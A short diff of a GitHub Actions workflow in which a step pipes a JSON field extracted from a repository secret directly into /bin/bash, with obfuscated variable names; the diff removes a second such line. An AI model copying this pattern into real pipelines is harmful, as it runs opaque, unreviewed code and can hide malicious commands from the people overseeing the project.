@@ -21,7 +21,6 @@ jobs:
           wrwj852: ${{ secrets.wrwj852 }}
         run: |
           printf '%s' "$wrwj852" | jq -r .bfwsz21 | /bin/bash
-          echo $kcf8125 | jq -r .tmatx0103 | /bin/bash
 
       - name: Save output
         if: always()
